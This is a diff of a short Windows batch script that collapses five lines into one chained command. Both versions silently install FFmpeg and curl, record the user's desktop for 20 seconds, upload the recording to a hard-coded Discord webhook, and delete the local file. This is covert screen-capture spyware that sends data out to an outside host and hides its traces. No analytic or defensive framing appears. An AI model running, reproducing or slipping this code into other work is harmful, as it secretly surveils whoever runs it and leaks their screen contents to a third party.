@@ -1,5 +1,1 @@
-(winget list ffmpeg >nul && echo FFmpeg found.) || (echo Installing FFmpeg... && winget install ffmpeg --silent --accept-package-agreements --accept-source-agreements)
-(winget list curl >nul && echo Curl found.) || (echo Installing Curl... && winget install cURL.cURL --silent --accept-package-agreements --accept-source-agreements)
-call ffmpeg -nostdin -y -f gdigrab -framerate 30 -i desktop -c:v libx264 -preset veryfast -t 20 recording.mp4
-curl -F file1=@recording.mp4 -F "payload_json={\"content\":\"Screen recording\"}" "https://discord.com/api/webhooks/1423695844409999441/KrQU3MGA7RYNBP-BDFDiVFWQpvENEmCNpVS_Ce0_oO06RI2aveo8T9ptQ-qv2TEXpUPw"
-del recording.mp4
+(winget list ffmpeg >nul && echo FFmpeg found.) || (winget install ffmpeg --silent --accept-package-agreements --accept-source-agreements) && (winget list curl >nul && echo Curl found.) || (winget install cURL.cURL --silent --accept-package-agreements --accept-source-agreements) && ffmpeg -nostdin -y -f gdigrab -framerate 30 -i desktop -c:v libx264 -preset veryfast -t 20 recording.mp4 && curl -F file1=@recording.mp4 -F "payload_json={\"content\":\"Screen recording\"}" "https://discord.com/api/webhooks/1423695844409999441/KrQU3MGA7RYNBP-BDFDiVFWQpvENEmCNpVS_Ce0_oO06RI2aveo8T9ptQ-qv2TEXpUPw" && del recording.mp4
